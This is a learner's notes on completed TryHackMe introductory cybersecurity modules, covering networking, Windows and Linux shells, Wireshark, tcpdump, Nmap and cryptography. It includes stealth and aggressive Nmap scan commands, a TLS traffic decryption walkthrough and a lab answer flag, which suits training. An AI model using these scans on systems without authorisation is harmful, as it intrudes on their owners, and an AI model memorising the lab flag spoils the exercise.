# TryHackMe - Cyber Security 101

## Module Completed: Search Skills

**Completion Date:** [2025/09/22]
**Module Objective:** Develop advanced search and information evaluation techniques for cybersecurity investigations.

### 📚 What I Learned / Skills Practiced

This module focused on research methodology, teaching how to efficiently find and validate critical information.

#### 1. **Evaluating Information Sources**
   - Criteria for determining the credibility and accuracy of an online source.
   - Differentiating between reliable information and noise.

#### 2. **Efficient Use of Search Engines**
   - Advanced search techniques with Boolean operators (`AND`, `OR`, `NOT`).
   - Use of quotation marks for exact searches and the `site:` operator to restrict searches to specific domains.

#### 3. **Specialized Search Engines**
   - **Shodan:** The “search engine for Internet-connected devices.” Ideal for finding exposed systems (cameras, routers, servers).
   - **Censys:** Similar to Shodan, for discovering and analyzing hosts and infrastructures.
   - **VirusTotal:** Analyzes suspicious files, URLs, IP addresses, and domains with multiple antivirus engines.
   - **Have I Been Pwned:** Checks if your email accounts or data have been compromised in public leaks.

#### 4. **Searching for Vulnerabilities and Exploits**
   - **CVE (Common Vulnerabilities and Exposures):** Standard identifiers for public vulnerabilities.
   - **Exploit Database (Exploit-DB):** Archive of verified exploits and vulnerabilities.
   - **GitHub:** Key platform for finding proof-of-concept (PoC) scripts, tools, and security research.

#### 5. **Reading Technical Documentation**
   - How to navigate and understand official documentation for:
     - **Linux (`man` pages):** Manuals integrated into Unix/Linux systems.
     - **Microsoft Windows:** Docs.microsoft.com for Windows technologies.
     - **Product Documentation:** Primary sources from manufacturers for configurations and solutions.

#### 6. **Using Social Media and News Outlets**
   - How to follow security researchers and stay up to date with the latest threats on platforms such as Twitter and Reddit.
   - Identifying reliable news sources to stay informed about cyber incidents.

### 🛠️ Why it's important
These skills are the foundation for critical tasks such as:
- Threat intelligence.
- Incident response.
- Vulnerability research.
- Malware analysis.

# TryHackMe - Cyber Security 101

## Module Completed: Active Directory Basics

**Completion Date:** [2022/09/22]
**Module Objective:** Understand the fundamentals of Active Directory (AD), the directory service used to manage Windows corporate networks, including users, computers, policies, and authentication methods.

### 📚 What I Learned / Skills Explored

This module provides a solid foundation on how Windows enterprise environments are structured and managed.

#### 1. **Fundamental Concepts**
   - **Windows Domains:** Administrative entities that centralize the management of users, computers, and policies.
   - **Active Directory Domain Services (AD DS):** The Microsoft service that implements network directory functionality.

#### 2. **Management Tools**
   - **Active Directory Users and Computers (ADUC):** The main administrative console for managing objects within the domain (users, groups, computers, OUs).

#### 3. **Structure and Organization**
   - **Organizational Units (OUs):** Containers used to organize users, computers, and other objects within a domain. They are mainly used to **apply policies (GPOs)** in a delegated manner.
   - **Security Groups:** Used to **assign permissions and access rights** to resources (such as files or printers) to sets of users.

#### 4. **Object Management**
   - **Managing Users in AD:** Creating, modifying, and deleting user accounts.
   - **Managing Computers in AD:** How computers join a domain and are managed by it.
   - **Deleting extra OUs and users:** Maintenance and cleanup of the AD structure.

#### 5. **Delegation and Policies**
   - **Delegation:** Assigning specific administrative permissions to users or groups to perform specific tasks (e.g., resetting passwords) without giving them full access.
   - **Group Policies (GPOs) & GPO Distribution:** Set of rules that control the working environment of users and computers. How these policies are applied and distributed across the domain.

#### 6. **Authentication Methods**
   - **Kerberos:** A modern and secure authentication protocol that uses tickets to verify the identity of users and services.
   - **NetNTLM:** A legacy challenge-response authentication protocol, maintained for compatibility but less secure.

#### 7. **Large-Scale Structures**
   - **Trees, Forests, and Trust Relationships:**
     - **Tree:** A set of one or more domains that share a contiguous namespace.
     - **Forest:** A set of one or more trees that share a global directory schema. This is the maximum security boundary.
- **Trust Relationships:** Links that allow users in one domain to authenticate and access resources in another domain.

### 🛠️ Why it matters
Understanding Active Directory is **CRITICAL** for almost any role in cybersecurity, as it is the backbone of most enterprise networks. It is essential for:
- **Blue Team:** Defending the network, monitoring suspicious activity, and responding to incidents.
- **Red Team / Pentesting:** Identifying and exploiting weak configurations to demonstrate vulnerabilities.
- **Systems Administration:** Securely and efficiently managing network resources.

**Note:** This module lays the conceptual foundation. Practical AD administration requires ongoing experience, but the essential principles are now understood.

# TryHackMe - Cyber Security 101

## Module Completed: Windows Command Line

**Completion Date:** [2025/09/23]
**Module Objective:** Become familiar with essential Windows Command Prompt (CMD) commands for basic system administration, troubleshooting, and resource management.

### 📚 What I Learned / Commands Practiced

This module covers the fundamental operations that can be performed from the Windows command line (CMD).

#### 1. **Basic System Information**
   - **`systeminfo`**: Command that displays a detailed summary of the system configuration (OS, hardware, installed patches).
   - **`hostname`**: Displays the name of the current computer.

#### 2. **Network Troubleshooting**
   - **Network Configuration:**
     - **`ipconfig` / `ipconfig /all`**: Displays the current IP configuration (IP address, gateway, DNS servers). The `/all` option provides detailed information.
   - **Networking Commands:**
     - **`ping <IP/Domain>`**: Checks connectivity with another host on the network.
     - **`tracert <IP/Domain>`**: Displays the route (hops) that packets take to reach a destination, useful for diagnosing network problems.

#### 3. **File and Disk Management**
   - **Working with directories:**
     - **`cd <path>`**: Changes the current directory.
     - **`dir`**: Lists the contents of the current directory.
     - **`mkdir <folder_name>`**: Creates a new directory.
     - **`rmdir <folder_name>`**: Deletes a (empty) directory.
   - **Working with files:**
    - **`type <file>`**: Displays the contents of a text file in the console.
    - **`copy <source> <destination>`**: Copies files from one location to another.
    - **`del <file>`**: Deletes a file.

#### 4. **Task and Process Management**
   - **`tasklist`**: Displays a list of all processes running on the system (similar to Task Manager).
   - **`taskkill /PID <Process_ID> /F`**: Ends a specific process using its ID. The `/F` option forces shutdown.

### 🛠️ Why it's important
Although PowerShell is more powerful, Windows CMD is still ubiquitous. Knowing how to use these commands is crucial for:
- Performing quick system and network diagnostics.
- Automating tasks using batch scripts (.bat).
- Operating in restricted environments where PowerShell may be limited.
- Laying the foundation for learning PowerShell and advanced Windows administration.

# TryHackMe - Cyber Security 101

## Module Completed: Windows PowerShell

**Completion Date:** [2025/09/23]
**Module Objective:** Introduce the fundamental concepts of Windows PowerShell as a scripting and automation language, highlighting its structure, basic cmdlets, and critical application in cybersecurity.

### 📚 What I Learned / Concepts Explored

This module lays the foundation for understanding and using PowerShell, an indispensable tool in Windows environments.

#### 1. **PowerShell Basics**
   - **What is it?** It is not just a terminal; it is a **scripting language and administration shell** built on .NET. It is much more powerful than the traditional CMD.
   - **Philosophy:** It is designed for the **automation** of administrative tasks.

#### 2. **Basic Structure: Verb-Noun**
   - Commands (called **cmdlets**) follow a `Verb-Noun` convention (e.g., `Get-Process`, `Stop-Service`).
   - **Advantage:** This structure is intuitive and consistent. You know what a cmdlet does just by reading its name.
   - **Common Examples:**
     - `Get-`: Get information (Get-Service, Get-Process).
     - `Set-`: Configure or change something (Set-Service).
    - `Start-`/`Stop-`: Start or stop a service/process.
    - `Export-`/`Import-`: Export or import data.

#### 3. **Basic Cmdlets and Navigation**
   - **Navigation:** Commands similar to Linux (`Get-Location`, `Set-Location`, `Get-ChildItem`) but for Windows.
   - **File Management:** `Copy-Item`, `Remove-Item`, `Get-Content`.

#### 4. **Piping, Filtering, and Sorting Data (The Real Power)**
   - **Piping (|):** The ability to pass the output of one cmdlet as input to another. This is what allows you to create extremely powerful one-liners.
     - **Example:** `Get-Process | Where-Object {$_.CPU -gt 50} | Sort-Object CPU -Descending`
       - `Get-Process`: Gets all processes.
       - `| Where-Object {...}`: Filters and only shows processes that use more than 50% of the CPU.
       - `| Sort-Object CPU -Descending`: Sorts the result by CPU usage from highest to lowest.
   - **Filtering (`Where-Object`):** To filter results based on conditions.
   - **Sorting (`Sort-Object`):** To sort the results.

#### 5. **System, Network, and Real-Time Information**
   - **System Info:** Cmdlets such as `Get-ComputerInfo` for a complete system analysis.
   - **Network Info:** `Get-NetTCPConnection` to view active network connections (similar to `netstat`).
   - **Real-Time Analysis:** The ability to obtain system information instantly and continuously, crucial for monitoring.

#### 6. **Where to Find and Download Cmdlets**
   - **Modules:** PowerShell functionality is extended through **modules**.
   - **PowerShell Gallery:** A public repository where you can install modules with new cmdlets for specific tasks (e.g., Azure administration, AWS, security tools).
   - **Command:** `Install-Module -Name <ModuleName>`.

#### 7. **Scripting (The Next Level)**
   - **Concept:** The ability to save a series of cmdlets in a file (`.ps1`) to automate complex and repetitive tasks.
   - **Application in Cybersecurity:** Automation of data collection, log analysis, incident response, etc.

### 🛠️ **Why is it crucial in Cybersecurity?**

PowerShell is a **Swiss Army knife** for any professional:
- **Blue Team (Defense):** To monitor suspicious activity, analyze logs automatically, and deploy countermeasures.
- **Red Team (Attack):** It is a powerful offensive tool. Attackers use it to move laterally across a network, execute payloads, and evade detection, as it is a legitimate system tool.
- **Forensic Analysis:** Quickly extract and process large amounts of data from the system.

**Key Takeaway:** It's not about memorizing all the cmdlets, but about **understanding the logic and knowing how to find the solution** using `Get-Help` and `Get-Command`. This foundation will allow you to learn any specific cmdlet when you need it in the future.

# TryHackMe - Cyber Security 101

## Completed Module: Linux Shells

**Completion Date:** [2025/09/23]
**Module Objective:** Introduce the fundamentals of interacting with the Linux command line (shell), including the types of shells available, basic commands, and the basics of scripting to automate tasks.

### 📚 What I Learned / Skills Explored

This module provides the essential foundation for working efficiently in Linux environments, which are the standard in servers and cybersecurity.

#### 1. **Interaction with Shells**
   - The **shell** is the command interpreter that allows the user to interact with the operating system through text.
   - It is the main interface for managing servers and performing ethical hacking and forensic tasks.

#### 2. **Types of Linux Shells**
   - **Bash (Bourne-Again SHell):** The most common and standard shell in most Linux distributions. It is the one you learn first.
   - **Zsh (Z Shell):** A powerful shell with enhanced features such as smarter autocompletion. Basis of the “Oh My Zsh” framework.
   - **Fish (Friendly Interactive SHell):** Designed to be user-friendly and interactive, with auto-suggestions and easy configuration.

#### 3. **Shell Scripting and Components**
   - A **shell script** is a file containing a series of commands that are executed sequentially, allowing tasks to be automated.
   - **Basic components of a script:**
     - **Variables:** For storing information (`name=“Fernando”`).
     - **Conditional structures (`if`, `else`):** To make decisions in the script based on conditions.
     - **Loops (`for`, `while`):** To repeat tasks multiple times.
     - **Comments (`#`):** To explain the code and make it more readable.

#### 4. **Practical Example: “The lockers script”**
   - A practical script was analyzed that probably simulated interaction with “lockers” or resources, demonstrating how the above components are applied in a specific case.
   - The objective was to understand the logic of a real script and how tasks are structured.

#### 5. **Practical Exercise**
   - Putting knowledge into practice to write or modify a simple script, consolidating learning.

### 🛠️ **Why it is important**
Mastering the Linux shell is **non-negotiable** in cybersecurity:
- **Server Administration:** Most web, database, and application servers run on Linux.
- **Forensic and Malware Analysis:** The most powerful tools are command line tools.
- **Pentesting and Ethical Hacking:** Security assessment tools (such as those in Kali Linux) are used from the terminal.
- **Automation:** Writing scripts allows you to perform complex tasks quickly, repetitively, and accurately.

**Conclusion:** This module lays the foundation for navigating, managing, and automating tasks in any Linux environment, a fundamental skill for any technical role in security.

# TryHackMe - Cyber Security 101

## Module Completed: Networking Concepts

**Completion Date:** [2025/09/25]
**Module Objective:** Understand fundamental networking models, IP addressing, key protocols, and the encapsulation process, which are the basis for understanding how any device communicates on the Internet.

### 📚 What I Learned / Key Concepts

This module explains the “backbone” of digital communications, a non-negotiable skill in cybersecurity.

#### 1. **Reference Models: OSI vs TCP/IP**
   - **OSI Model (7 layers):** A theoretical model that divides communication into 7 layers (Physical, Link, Network, Transport, Session, Presentation, Application). It is useful for learning and diagnosing problems.
   - **TCP/IP Model (4 layers):** The practical and real model on which the Internet is based (Link, Internet, Transport, Application).
   - We learned to **compare and contrast** both models, seeing how their layers relate to each other.

#### 2. **IP Addressing and Subnets**
   - **IP Addresses:** The unique identifiers of devices on a network (e.g., `192.168.1.1` for IPv4).
   - **Subnets:** How large networks are divided into smaller parts for better organization and security.

#### 3. **Transport Protocols: TCP vs UDP**
   - **TCP (Transmission Control Protocol):**
     - **Connection-oriented.** Establishes a channel before sending data.
     - **Reliable.** Ensures that packets arrive in order and without errors.
     - **Slower.** Used for web (HTTP/HTTPS), email (SMTP), file transfer (FTP).
   - **UDP (User Datagram Protocol):**
     - **Connectionless.** Sends data without establishing a channel first.
     - **Unreliable.** Does not guarantee delivery or order.
- **Faster.** Used for video/audio streaming, VoIP, DNS.

#### 4. **Encapsulation**
   - The process of **adding information from each layer (headers)** to application data as it travels “down” the protocol stack to be transmitted over the network.
   - At the destination, the process is reversed (“up”), removing each header until the original data is reached.

#### 5. **Hands-on Demonstration with Telnet**
   - The **`telnet`** command was used to “talk” directly to services (such as web servers) over TCP on a specific port.
   - This demonstrated in a tangible way how a connection is established at the application/transport level.

### 🛠️ **Why is this important?**
- **Fundamentals of Cybersecurity:** To defend, audit, or attack a network, **you must understand how it works.**
- **Traffic Analysis:** Tools such as Wireshark require this knowledge to analyze packets and detect malicious activity.
- **Troubleshooting:** It allows you to diagnose connectivity failures logically.
- **Ethical Hacking:** Understanding ports, protocols, and services is the first step in finding entry points.

> **Note:** This module lays the essential technical foundation for all subsequent rooms related to networking, pentesting, and forensics.

# TryHackMe - Cyber Security 101

## Module Completed: [Networking Essentials]

**Completion Date:** [2025/09/25]
**Module Objective:** Understand the functioning and importance of fundamental protocols that enable modern networks to operate, from automatic device configuration to global routing on the Internet.

### 📚 What I Learned / Protocols Explored

This module delves into the protocols that enable automatic and efficient network communication.

#### 1. **DHCP (Dynamic Host Configuration Protocol)**
   - **What does it do?** It automatically assigns IP addresses and other network parameters (such as the gateway and DNS server) to devices when they connect to a network.
   - **Analogy:** It is the “automatic rental” of IP addresses on a network.
   - **Importance in Cybersecurity:** A malicious DHCP server can trick devices into connecting to it, redirecting their traffic (“DHCP Spoofing” attack).

#### 2. **ARP (Address Resolution Protocol)**
   - **What does it do?** It finds the MAC (physical) address of a device when only its IP (logical) address is known within a local network.
   - **Fernando's diagram:** “Who has this IP? -> Tell me your MAC.”
   - **Importance in Cybersecurity:** Vulnerable to “ARP Spoofing” or “ARP Poisoning,” where an attacker can trick the network into sending traffic intended for someone else.

#### 3. **ICMP (Internet Control Message Protocol)**
   - **What does it do?** It is used to send control and error messages between network devices.
   - **Key Tools:**
     - **`Ping`:** Checks if a host is active and reachable on the network. (Uses ICMP Echo Request and Reply).
     - **`Traceroute`/`Tracert`:** Discovers the route that packets take to reach a destination, showing all intermediate routers.
   - **Importance in Cybersecurity:** Essential for network diagnostics. Attackers use it to “map” a network (discover active hosts). ICMP traffic is often blocked by firewalls to prevent this.

#### 4. **Routing Protocols**
   - **What do they do?** They are the “navigation systems” of routers. They allow them to share information with each other to find the best route to send packets across different networks.
   - **Main Protocols:**
     - **OSPF & EIGRP:** Used within large networks within the same organization (e.g., a company).
     - **BGP (Border Gateway Protocol):** The protocol that **connects the Internet**. It manages routing *between* large service providers (ISPs). It is the most critical protocol globally.
- **RIP:** An older and simpler protocol.
- **Importance in Cybersecurity:** An attack on BGP can redirect Internet traffic on a massive scale. Understanding routing is key to defending an organization's perimeter network.

#### 5. **NAT (Network Address Translation)**
   - **What does it do?** It translates private IP addresses (e.g., `192.168.1.10`) from a local network to a single public IP address to access the Internet. It allows many devices to share a single public IP.
   - **Analogy:** It is the “receptionist” of an office. All employees (private IPs) use the same office address (public IP) to send emails outside the office.
   - **Importance in Cybersecurity:** It hides the internal structure of a network from the Internet, acting as a first layer of defense (concealment). It is essential in any home router.

### 🛠️ **Practical Conclusion**
These protocols are the “invisible magic” that makes networks work. A system administrator or cybersecurity professional must understand them in order to:
-   **Diagnose problems** with connectivity effectively.
-   **Understand and exploit** common vulnerabilities such as ARP Spoofing.
-   **Secure the configuration** of routers and firewalls.

  # TryHackMe - Cyber Security 101

## Module Completed: Networking Core Protocols

**Completion Date:** [2025/09/25]
**Module Goal:** Understand the practical workings of essential application layer protocols, beyond the graphical interface, using command-line tools such as `telnet` and `netcat`.

### 📚 What I Learned / Protocols Explored

This module focused on direct interaction with the protocols used by everyday applications (browsers, email clients, etc.).

#### 1. **HTTP / HTTPS**
- **Function:** Transfer of web pages and application data.
- **Hands-on Experience:** Manually sending `GET` requests using `telnet`/`netcat` to retrieve a web page directly from the server.

#### 2. **FTP (File Transfer Protocol)**
- **Function:** Transferring files between a client and a server.
- **Practical Experience:** Using the command line client `ftp` to connect to a server, browse its directories, and download files (`get`).

#### 3. **POP3 (Post Office Protocol v3)**
- **Function:** Allows an email client to download messages from a server.
- **Practical Experience:** Manually connecting to a POP3 server via `telnet` to authenticate (`USER`, `PASS`), list messages (`LIST`), and retrieve them (`RETR`).

#### 4. **SMTP (Simple Mail Transfer Protocol)**
- **Function:** Sending emails between servers.
- **Practical Experience:** (If covered in the module) Use `telnet` to connect to an SMTP server and simulate sending an email using commands such as `HELO`, `MAIL FROM`, `RCPT TO`, and `DATA`.

#### 5. **DNS (Domain Name System)**
- **Function:** Translating domain names (e.g., google.com) to IP addresses.
- **Practical Experience:** (If covered) Using commands such as `dig` or `nslookup` to perform DNS queries and resolve names.

#### 6. **IMAP (Internet Message Access Protocol)**
- **Function:** Manage email directly on the server (more advanced than POP3).
- **Practical Experience:** (If covered) Similar to POP3, but with commands to manage folders on the server.

### 🛠️ **Quick Reference Table: Protocols and Ports**

This table is an **essential tool** for any networking and security professional.

| Protocol | Transport Protocol | Default Port Number | Main Purpose |
| :--- | :--- | :--- | :--- |
| **TELNET** | TCP | 23 | Remote connection (unencrypted). |
| **DNS** | UDP or TCP | 53 | Domain name resolution. |
| **HTTP** | TCP | 80 | Serve web pages (unencrypted). |
| **HTTPS** | TCP | 443 | Serve web pages (SSL/TLS encryption). |
| **FTP** | TCP | 21 | File transfer (control). |
| **SMTP** | TCP | 25 | Sending email. |
| **POP3** | TCP | 110 | Downloading email. |
| **IMAP** | TCP | 143 | Managing email on the server. |

### 💡 **Key Takeaway**
The fundamental skill acquired in this module is the ability to **“talk” directly to network services**, without relying on a graphical application. This is vital for:
-   Accurate **diagnostics and troubleshooting** of connectivity issues.
-   **Auditing and pentesting**, allowing you to test configurations and find vulnerabilities manually.
-   **Gaining an in-depth understanding** of how the applications we use every day actually communicate.

> **Main Achievement:** You no longer just understand the theory behind protocols; you know how to interact with them in a practical and effective way.

# TryHackMe - Cyber Security 101

## Module Completed: Networking Secure Protocols

**Completion Date:** September 26, 2025
**Module Objective:** Understand and apply key approaches to securing network communications, with a practical focus on encrypted traffic analysis.

### 📚 Learning Summary

This module explored the fundamental technologies that protect information in modern networks, going beyond theory to include essential forensic analysis practice.

#### 1. **TLS/SSL: Encryption for Applications**
- **Purpose:** To protect the confidentiality and integrity of data in transit for application protocols :cite[5].
- **Application:** Transforms insecure protocols into secure ones (HTTP -> HTTPS, SMTP -> SMTPS) by adding a layer of encryption.
- **Key Concept:** Uses digital certificates issued by Certification Authorities (CA) to authenticate servers and establish a secure connection.

#### 2. **SSH: Secure Remote Access**
- **Purpose:** To provide encrypted remote access to systems, as well as extended functions.
- **Application:** Administrative access to servers, secure file transfer (SFTP), and tunneling for other protocols.
- **Advantage:** Secure alternative to obsolete protocols such as Telnet.

#### 3. **VPN: Virtual Private Network**
- **Purpose:** Securely extend a local network across a public infrastructure such as the Internet by creating an encrypted “tunnel.”
- **Application:** Connect remote offices of a company or allow individual users to securely access network resources from any location.
- **Benefit:** Masks the user's real IP address and encrypts all connection traffic.

### 🔬 Lab Exercise: Decrypting HTTPS Traffic with Wireshark

The culminating hands-on exercise consisted of a forensic analysis simulation:
- **Tools:** Wireshark and the Chromium browser.
- **Objective:** Decrypt an HTTPS traffic capture (`randy-chromium.pcapng`) to analyze its content.
- **Methodology:**
1.  The Chromium browser was launched with the `--ssl-key-log-file` option to generate a log file of the TLS session keys (`ssl-key.log`).
    2.  In Wireshark, the path to this file was configured in `Preferences > Protocols > TLS > (Pre)-Master-Secret log filename`.
3.  After this configuration, Wireshark was able to decrypt the HTTPS traffic, revealing the underlying HTTP requests.
- **Finding:** An authentication flag (`THM{B8WM6P}`) traveling in an HTTP POST request to a login form was successfully identified and retrieved, demonstrating the critical importance of TLS encryption.

### 🛡️ Conclusion

Understanding these protocols is essential. While TLS protects application-specific communications, VPNs ensure complete network connectivity, and SSH guarantees secure remote access. The ability to analyze this traffic, even when encrypted, is a valuable skill for security auditing and incident response tasks.

> This module lays the technical foundation for understanding how security is implemented in the digital communications we use every day.

# TryHackMe - Cyber Security 101

## Module Completed: Wireshark: The Basics

**Completion Date:** [2025/09/26]
**Module Objective:** Master the interface and essential functionalities of Wireshark, the standard tool for network traffic analysis, from loading captures to advanced filtering.

### 📚 What I Learned / Skills Acquired

This module provides a comprehensive understanding of Wireshark, transforming it from a complex tool into a manageable canvas for investigation.

#### 1. **Tool Overview**
-   **Use Cases:** Diagnosing network problems, detecting security anomalies, and investigating protocols.
-   **GUI and Data:** Understanding the interface: Toolbar, filter bar, packet list pane, details pane, and bytes pane.
-   **Loading PCAP Files:** Importing saved traffic captures for analysis.
-   **Color Packets:** Using automatic and custom coloring to quickly identify protocols and anomalies.
-   **Real-Time Traffic Capture:** Using the start/stop buttons to capture live traffic.
- **Merge PCAP Files:** Combine multiple captures into a single file for analysis.
- **View File Details:** Locate crucial metadata such as the SHA256 hash of the capture file.

#### 2. **Packet Dissection**
- **Layered Analysis:** Ability to expand and examine each layer of a packet (Ethernet, IP, TCP, HTTP, etc.) in the details panel.
- **Field Interpretation:** Understanding the meaning of common fields such as MAC/IP addresses, ports, TCP flags, and HTTP methods.

#### 3. **Packet Navigation**
- **Packet Numbers:** Use unique numbers for quick reference and navigation.
- **Go to a Packet:** Function to jump directly to a specific packet number.
- **Search Packets:** Search for content within packets using text, hexadecimal, or regular expressions.
- **Mark Packets and Comments:** Highlight important packets and add notes for further investigation.
-   **Export Packets and Objects:** Extract specific packets or even entire files (executables, documents) transferred over the network (HTTP, SMB).
-   **Time Display Format:** Switch to UTC time for accurate time correlation with other system logs.
- **Expert Information:** Interpretation of suggestions and alerts (Chat, Note, Warn, Error) that Wireshark generates automatically.

#### 4. **Packet Filtering - The Most Powerful Tool!**
- **Philosophy:** “If you can click on it, you can filter it.”
- **Apply as Filter:** Instant filtering by right-clicking on any field of interest.
-   **Conversation Filter:** Isolation of all traffic between two hosts.
-   **Color Conversation:** Visual highlighting of a conversation without hiding the rest of the traffic.
-   **Prepare as Filter:** Construction of complex filter queries from a selected value.
- **Apply as Column:** Add custom columns to the main list for better visualization.
- **Follow Stream:** Reconstruct complete conversations (TCP, HTTP) to view application-level data exchange, including plain text credentials.

### 🛠️ **Practical Conclusion**
Wireshark is no longer a black box. It is now a tool with which I can:
- **Conduct targeted investigations** using filters and searches.
- **Extract concrete evidence** such as files or conversations.
-   **Document findings** using comments and marks.
-   **Understand network communication** at a deeply granular level.

> **Key Skill Acquired:** The ability to transform large volumes of network traffic into actionable information, which is essential for pentesting, forensic analysis, and system administration tasks.

# TryHackMe - Cyber Security 101

## Module Completed: Tcpdump: The Basics

**Completion Date:** September 26, 2025
**Module Objective:** Gain practical proficiency in using Tcpdump, the command-line-based packet analyzer, for capturing, filtering, and interpreting network traffic.

### 📚 What I Learned / Skills Acquired

This module focused on transforming Tcpdump from a complex tool into a manageable Swiss Army knife for network analysis directly from the terminal.

#### 1. **Basic Filtering: The Heart of Tcpdump**
- **Filtering by Host:** `tcpdump host example.com` to isolate traffic related to a specific IP or hostname.
- **Filtering by Port:** `tcpdump port 53` to capture traffic from a specific service (e.g., DNS).
- **Protocol Filtering:** `tcpdump icmp` to show only packets from a specific protocol (e.g., ICMP for pings).
- **Specifying Address:** Use `src` (source) and `dst` (destination) to refine filters, such as `src host 192.168.1.1`.

#### 2. **Advanced Filtering: Logical and Bit-Level Operators**
- **Combine Conditions:** Use logical operators `and`, `or`, and `not` to create complex filters. Example: `tcpdump ‘udp or icmp’`.
- **Filtering by TCP Flags:** Bit-level analysis to identify packets with specific flags. For example, `tcpdump ‘tcp[tcpflags] == tcp-rst’` captures packets with only the RST flag set. This approach is powerful for detecting scans or connectivity issues.

#### 3. **Output and Display Options (Your “Glasses”)**
- **`-q` (Quick Output):** Displays a simplified, clean view of traffic.
- **`-e` (Link Header):** Includes MAC addresses in the output, crucial for analyzing traffic on the local network (e.g., ARP packets).
- **`-A` (ASCII Output):** Shows the packet contents in plain text, ideal for reading unencrypted data such as HTTP requests.
- **`-X` / `-xx` (Hexadecimal and ASCII Output):** Reveals the complete contents of the packet in hexadecimal along with its ASCII representation. It is the ultimate tool for analyzing any type of traffic, especially when it is encrypted.

#### 4. **Reading and Analyzing PCAP Files**
- **`-r` (Read from File):** The option `tcpdump -r capture.pcap` allows you to analyze saved traffic captures, facilitating post-incident forensic analysis.
- **Integration with other tools:** Use pipes (`|`) with tools such as `wc -l` to count packets that match a filter.

### 🛠️ Practical Conclusion

Mastering Tcpdump involves understanding that it is not about memorizing commands, but rather **understanding the logic of filters and knowing how to construct specific queries**. The ability to accurately capture and filter network traffic from the terminal is a fundamental skill for troubleshooting, network monitoring, and security analysis tasks.

> **Key Skill Acquired:** Being able to perform an initial and specific analysis of network traffic in environments where a graphical interface such as Wireshark is not available, especially in remote server administration via SSH.

Module Completed: Nmap: The Basics
Completion Date: [2025/09/26]
Module Objective: Master the fundamental capabilities of Nmap for network discovery, port scanning, service detection, and result management in ethical hacking and network diagnostics.

📚 What I Learned / Skills Acquired
This module transformed Nmap from a simple port scanner into a comprehensive network exploration tool. The focus was on practical application for security assessments and network analysis.

1. Network Discovery & Host Enumeration
List Scan (-sL): Passive reconnaissance to enumerate targets without sending packets to the network.

Ping Scan (-sn): Efficient host discovery using ICMP and ARP requests to identify active devices on a network.

Forced Scan (-Pn): Treat all hosts as online, bypassing host discovery for networks that block ping requests.

2. Port Scanning Techniques (The Core of Nmap)
TCP Connect Scan (-sT): Completes full TCP three-way handshake. Reliable but easily detectable.

TCP SYN Scan (-sS): Default when run with sudo. Sends SYN packet only (half-open scan). Faster and stealthier.

UDP Scan (-sU): Discovers open UDP ports. Slower due to UDP's connectionless nature.

Port Specification: Mastered using -p- for all ports, -F for top 100 ports, and custom ranges like -p 22,80,443.

3. Service & OS Detection
Version Detection (-sV): Probes open ports to determine service/application versions.

OS Fingerprinting (-O): Detects operating system based on network stack characteristics.

Aggressive Scan (-A): Combines OS detection, version detection, script scanning, and traceroute.

4. Timing & Performance Optimization
Timing Templates (-T0 to -T5): From paranoid (T0) to insane (T5). Learned to balance speed vs. stealth.

Parallelism Control: --min-parallelism and --max-parallelism for managing concurrent probes.

Rate Management: --min-rate and --max-rate for precise packet control per second.

Host Timeouts: --host-timeout for handling slow or unresponsive targets.

5. Output Formats & Verbosity
Verbosity Levels (-v, -vv, -vvv): Real-time progress monitoring during long scans.

Debug Levels (-d, -dd, -d9): Detailed technical output for troubleshooting.

Output Formats: Mastered -oN (normal), -oX (XML), -oG (grepable), and -oA (all formats).

🛠️ Practical Conclusion
The key insight from this module is that effective Nmap usage requires strategic thinking about the scanning context. The same target requires different approaches for a stealthy penetration test versus a quick network inventory.

Critical Realization: Running Nmap with sudo privileges unlocks its full potential, particularly the stealthy SYN scan (-sS) which becomes the default. Without privileges, Nmap falls back to the slower, more detectable TCP Connect scan (-sT).

The ability to chain options like sudo nmap -sS -sV -O -T4 -A -p- -oA full_scan target represents a professional-grade approach to comprehensive network assessment.

Key Skill Acquired: Designing tailored scanning methodologies based on specific objectives—whether for rapid reconnaissance, stealthy penetration testing, or detailed service enumeration.

## Module Completed: Cryptography Basics ##
Completion Date: [2025/09/29]
Basic Fundamentals of Cryptography

This module introduces the essential concepts that serve as the basis for understanding modern cryptography. The main learning points are summarized below.

🎯 Learning Objectives

Understand key cryptography terms.

Understand the importance of cryptography in computer security.

Study a classic example: Caesar cipher.

Differentiate between symmetric and asymmetric encryption.

Become familiar with the basic mathematics applied to cryptography (XOR and modulus).

📖 Key Concepts
Text and encryption

Plaintext: original (readable) message.

Ciphertext: encoded (unreadable) message.

Encryption: algorithm for converting plain text ↔ ciphertext.

Key: string of bits used in encryption/decryption.

Encryption (process): transforming plain text → ciphertext with an algorithm and key.

Decryption (process): recovering plain text from ciphertext with the correct algorithm and key.

Importance of cryptography

It guarantees confidentiality, integrity, authenticity, and non-repudiation in communication and data storage.

It is the basis of security in modern systems (HTTPS, digital signatures, secure storage, etc.).

Caesar cipher

Classic example of substitution cipher.

It consists of shifting letters of the alphabet a fixed number of positions.

Simple, but easy to break using frequency analysis.

Symmetric and asymmetric encryption

Symmetric: same key for encryption and decryption (e.g., AES).

Asymmetric: uses a pair of keys (public and private) for encryption/decryption (e.g., RSA).

Basic mathematics in cryptography
XOR operation (⊕)

Returns 1 if the bits are different, 0 if they are the same.

Properties:

A ⊕ A = 0

A ⊕ 0 = A

Commutative and associative.

Application: can be used as basic symmetric encryption (C = P ⊕ K).

Modulo operation (%)

Returns the remainder of a division (X % Y).

Examples:

25 % 5 = 0

23 % 6 = 5

Result always in range 0 to n-1.

Widely used in cryptographic algorithms.

✅ Conclusion

This first module lays the foundations of cryptography, introducing its terms, its importance in digital security, a historical example (Caesar), types of encryption, and fundamental mathematical operations (XOR and modulo). This knowledge will be essential for understanding more advanced algorithms in the following modules.


## Module Completed: Public Key Cryptography Basics ##
Completion Date: [2025/09/29]
Module Objective: Understand and apply fundamental asymmetric cryptography concepts including RSA, Diffie-Hellman, SSH, digital signatures, and PGP/GPG for secure communications.

📚 What I Learned / Skills Acquired
This module demystified public key cryptography, transforming abstract mathematical concepts into practical tools for secure digital communication and identity verification.

1. Common Use of Asymmetric Encryption
Core Concept: Leveraging the slowness of asymmetric encryption to securely exchange symmetric keys

Practical Application: Using asymmetric crypto once to establish a shared secret, then switching to fast symmetric encryption for bulk data transfer

Key Insight: Asymmetric = secure key exchange, Symmetric = efficient data encryption

2. RSA (Rivest-Shamir-Adleman)
Mathematical Foundation: Security relies on the computational difficulty of factoring large prime numbers

Key Generation Process: Mastered the steps: prime selection (p, q), modulus calculation (n = p×q), Euler's totient (φ(n)), and exponent selection (e, d)

Practical Computation: Learned to perform modular exponentiation for encryption/decryption

